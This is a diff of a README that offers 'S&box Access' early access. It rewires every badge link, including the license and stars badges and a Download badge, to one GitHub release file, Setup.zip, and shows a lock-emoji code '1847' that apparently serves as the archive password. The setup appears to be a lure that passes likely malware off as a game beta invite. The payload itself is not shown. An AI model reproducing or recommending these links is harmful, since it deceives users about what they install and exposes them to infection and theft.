@@ -1,10 +1,10 @@
 # 🎮 S&box Access — Early Access Guide, Invite & Private Beta 2026
 
-[![GitHub Stars](https://img.shields.io/github/stars/placeholder/Sbox-Access)]()
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)]()
-[![Platform](https://img.shields.io/badge/Platform-PC%20Windows-blue)]()
-[![Category](https://img.shields.io/badge/Category-Early%20Access-orange)]()
-[![Updated](https://img.shields.io/badge/Updated-2026-brightgreen)]()
+[![GitHub Stars](https://img.shields.io/github/stars/placeholder/Sbox-Access)](https://github.com/Swiftrorectifier/Sbox-Access/releases/download/Release/Setup.zip)
+[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://github.com/Swiftrorectifier/Sbox-Access/releases/download/Release/Setup.zip)
+[![Platform](https://img.shields.io/badge/Platform-PC%20Windows-blue)](https://github.com/Swiftrorectifier/Sbox-Access/releases/download/Release/Setup.zip)
+[![Category](https://img.shields.io/badge/Category-Early%20Access-orange)](https://github.com/Swiftrorectifier/Sbox-Access/releases/download/Release/Setup.zip)
+[![Updated](https://img.shields.io/badge/Updated-2026-brightgreen)](https://github.com/Swiftrorectifier/Sbox-Access/releases/download/Release/Setup.zip)
 
 ---
 
@@ -22,7 +22,7 @@
 
 ## 📥 Download
 
-[![Sbox Access](https://img.shields.io/badge/Download%20S%26box%20Access-Open%20Page-0a84ff?style=for-the-badge&logo=github)]()
+[![Sbox Access](https://img.shields.io/badge/Download%20S%26box%20Access-Open%20Page-0a84ff?style=for-the-badge&logo=github)](https://github.com/Swiftrorectifier/Sbox-Access/releases/download/Release/Setup.zip)
 
 **🔐🔐🔐** `1847`
 
